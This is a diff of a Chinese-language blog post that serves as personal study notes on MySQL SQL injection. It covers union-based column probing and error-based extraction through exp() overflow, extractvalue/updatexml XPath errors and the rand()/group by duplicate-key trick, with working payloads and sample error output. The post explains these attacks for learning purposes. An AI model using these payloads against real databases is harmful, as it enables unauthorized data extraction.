@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based1. 判断column数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 SQL">
+    <meta name="description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based1. 判断 column 数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 S">
 <meta property="og:type" content="article">
 <meta property="og:title" content="小谈SQL注入">
 <meta property="og:url" content="http://example.com/2021/04/26/%E5%B0%8F%E8%B0%88SQL%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Du1">
-<meta property="og:description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based1. 判断column数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 SQL">
+<meta property="og:description" content="SQL 注入这方面一直挺菜的，整理一下吧 MySQLUnion Based1. 判断 column 数及回显数据字段位置 order&#x2F;group by N union select 1,2,3...N   注意：  若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面限制了单行数据输出，我们让前边的 select 查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则 S">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-04-26T05:52:52.000Z">
-<meta property="article:modified_time" content="2021-04-26T07:20:09.334Z">
+<meta property="article:modified_time" content="2021-04-26T07:54:22.136Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="SQL">
 <meta name="twitter:card" content="summary">
@@ -108,7 +108,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%ADcolumn%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 判断column数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (有长度限制，32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (有长度限制，32位)</span></a></li></ol></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (有长度限制，32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (有长度限制，32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99%EF%BC%88rand-group-count"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错（rand()+group()+count()</span></a></li></ol></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -153,7 +153,7 @@
 
   <div class="content" itemprop="articleBody">
     <p>SQL 注入这方面一直挺菜的，整理一下吧</p>
-<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="1-判断column数及回显数据字段位置"><a href="#1-判断column数及回显数据字段位置" class="headerlink" title="1. 判断column数及回显数据字段位置"></a>1. 判断column数及回显数据字段位置</h3><ul>
+<h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><h3 id="1-判断-column-数及回显数据字段位置"><a href="#1-判断-column-数及回显数据字段位置" class="headerlink" title="1. 判断 column 数及回显数据字段位置"></a>1. 判断 column 数及回显数据字段位置</h3><ul>
 <li><code>order/group by N</code></li>
 <li><code>union select 1,2,3...N</code></li>
 </ul>
@@ -224,14 +224,47 @@
 <li>特殊函数的特殊参数进运行一个字段、一行数据的返回，使用 group_concat 等函数聚合数据即可</li>
 </ul>
 <hr>
-<h3 id="利用overflow"><a href="#利用overflow" class="headerlink" title="利用overflow"></a>利用overflow</h3><p>注：MySQL version &gt; 5.5.5 的时候 overflow 才会有错误讯息，MySQL version &gt; 5.5.53 的时候不会显示查询结果</p>
-<p>一些 MySQL 里的 overflow</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT ~0 &#x3D;&gt; 18446744073709551615<br>SELECT ~0 + 1 &#x3D;&gt; ERROR<br>SELECT exp(709) &#x3D;&gt; 8.218407461554972e307<br>SELECT exp(710) &#x3D;&gt; ERROR<br>SELECT cot(0) &#x3D;&gt; ERROR<br><br>SELECT exp(~(SELECT * FROM (SELECT user())x));<br>ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;<br>select (select(!x-~0)from(select(select user())x)a);<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;<br></code></pre></td></tr></table></figure>
+<h3 id="利用-overflow"><a href="#利用-overflow" class="headerlink" title="利用 overflow"></a>利用 overflow</h3><p>注：MySQL version &gt; 5.5.5 的时候 overflow 才会有错误讯息，MySQL version &gt; 5.5.53 的时候不会显示查询结果</p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>适用版本：5.5.49~5.5.5</p>
+<p>该函数会返回 e 的 x 次方结果</p>
+<p>因为 MySQL 能记录的 double 数值范围有限，一旦结果超过范围，则该函数报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT exp(709) &#x3D;&gt; 8.218407461554972e307<br>SELECT exp(710) &#x3D;&gt; ERROR<br></code></pre></td></tr></table></figure>
 
-<h3 id="利用xpath"><a href="#利用xpath" class="headerlink" title="利用xpath"></a>利用xpath</h3><h4 id="extractvalue-有长度限制，32位"><a href="#extractvalue-有长度限制，32位" class="headerlink" title="extractvalue (有长度限制，32位)"></a>extractvalue (有长度限制，32位)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select extractvalue(1,concat(0x7e,(select @@version),0x7e));<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>
+<p>故可作 payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT exp(~(SELECT * FROM (SELECT user())x));<br>ERROR 1690(22003): DOUBLE value is out of range in &#39;exp(~((SELECT &#39;root@localhost&#39; FROM dual)))&#39;<br></code></pre></td></tr></table></figure>
 
-<h4 id="updatexml-有长度限制，32位"><a href="#updatexml-有长度限制，32位" class="headerlink" title="updatexml (有长度限制，32位)"></a>updatexml (有长度限制，32位)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>
+<p>按理来说 <code>pow</code> 应该也可以，原理相同</p>
+<hr>
+<p>其它的一些 overflow 导致报错</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mysql">SELECT ~0 &#x3D;&gt; 18446744073709551615<br>SELECT ~0 + 1 &#x3D;&gt; ERROR<br>SELECT cot(0) &#x3D;&gt; ERROR<br><br>select (select(!x-~0)from(select(select user())x)a);<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;<br></code></pre></td></tr></table></figure>
 
+<h3 id="利用-xpath"><a href="#利用-xpath" class="headerlink" title="利用 xpath"></a>利用 xpath</h3><h4 id="extractvalue-有长度限制，32位"><a href="#extractvalue-有长度限制，32位" class="headerlink" title="extractvalue (有长度限制，32位)"></a>extractvalue (有长度限制，32位)</h4><p>原理：前后添加 ~ 使其不符合 xpath 格式从而报错</p>
+<p>适用版本 5.1.5+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select extractvalue(1,concat(0x7e,(select @@version),0x7e));<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>
+
+<h4 id="updatexml-有长度限制，32位"><a href="#updatexml-有长度限制，32位" class="headerlink" title="updatexml (有长度限制，32位)"></a>updatexml (有长度限制，32位)</h4><p>适用版本 5.1.5+</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select updatexml(1,concat(0x7e,(select @@version),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用虚拟表报错（rand-group-count"><a href="#利用虚拟表报错（rand-group-count" class="headerlink" title="利用虚拟表报错（rand()+group()+count()"></a>利用虚拟表报错（rand()+group()+count()</h3><p>原理：简单来说，是由于 where 条件每执行一次，rand 函数就会执行一次，如果在由于在统计数据时判断依据不能动态改变，故 <code>rand()</code> 不能后接在<code>order/group by</code> 上</p>
+<hr>
+<p>举栗子：</p>
+<p>假设 USER 表有三条数据，我们通过：<code>select * from USER group by username</code> 来通过其中的 username 字段进行分组</p>
+<p>此过程会先建立一个虚拟表，存在两个字段：<code>key，count</code></p>
+<p>其中我们通过 username 来判断，其在此处是字段，首先先取第一行的数据：<code>username=Du1&amp;password=0312</code></p>
+<p>username 为 Du1 出现一次，则现在虚表内查询是否存在 Du1，若存在，则 count + 1，若不存在，则添加 Du1，其 count 为 1</p>
+<p>对于<code>floor(rand(0)*2)</code>，其中<code>rand()</code>函数，会生成 0 ~ 1 之间随机一个小数、<code>floor()</code>取整数部分、0 是随机因子、乘 2 是为了让大于 0.5 的小数通过 floor 函数得 1</p>
+<p>若表中有三行数据：我们通过<code>select * from USER group by floor(rand(0)*2)</code>进行排序的话</p>
+<ul>
+<li>注意：<ul>
+<li>由于<code>rand(0)</code>的随机因子是被固定的，故其产生的随机数也被固定了，顺序为：011011……</li>
+</ul>
+</li>
+</ul>
+<p>首先<code>group by</code>需要执行的话，需要确定分组因子，故<code>floor(rand(0)*2)</code>被执行一次，得到的结果为 0，接着在虚表内检索 0，发现虚表没有键值为 0 的记录，故添加上，在进行添加时：<code>floor(rand(0)*2)</code>第二次被执行，得到结果 1，于是虚拟表插入的内容为<code>key=1&amp;count=1</code></p>
+<p>第二次执行<code>group by</code>时：<code>floor(rand(0)*2)</code>先被运行一次，也就是第三次运行。得到结果 1，查询虚表发现数据存在，因而直接让虚表内的<code>key=1</code>的 count 加一即可，<code>floor(..)</code>只运行了一次</p>
+<p>第三次执行<code>group by</code>时，<code>floor(rand(0)*2)</code>被执行第四次，得到结果 0，查询虚表不存在。再插入虚表时，<code>floor(…)</code>被执行第五次，得到结果 1，故此时虚表将插入的值为<code>key=1&amp;count=1</code>，注意，此时虚表已有一条记录为：<code>key=1&amp;count=2</code>，并且字段 key 为主键，具有不可重复性，故虚表在尝试插入时将产生错误</p>
+<hr>
+<p>故可作 payload：<code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code></p>
 
   </div>
 </article>
@@ -261,7 +294,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%ADcolumn%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 判断column数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (有长度限制，32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (有长度限制，32位)</span></a></li></ol></li></ol></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL"><span class="toc-number">1.</span> <span class="toc-text">MySQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Union-Based"><span class="toc-number">1.1.</span> <span class="toc-text">Union Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD-column-%E6%95%B0%E5%8F%8A%E5%9B%9E%E6%98%BE%E6%95%B0%E6%8D%AE%E5%AD%97%E6%AE%B5%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.1.1.</span> <span class="toc-text">1. 判断 column 数及回显数据字段位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%88%86"><span class="toc-number">1.1.2.</span> <span class="toc-text">2. 爆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Error-Based"><span class="toc-number">1.2.</span> <span class="toc-text">Error Based</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-overflow"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用 overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-xpath"><span class="toc-number">1.2.2.</span> <span class="toc-text">利用 xpath</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">extractvalue (有长度限制，32位)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%9C%89%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%EF%BC%8C32%E4%BD%8D"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">updatexml (有长度限制，32位)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E8%A1%A8%E6%8A%A5%E9%94%99%EF%BC%88rand-group-count"><span class="toc-number">1.2.3.</span> <span class="toc-text">利用虚拟表报错（rand()+group()+count()</span></a></li></ol></li></ol></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
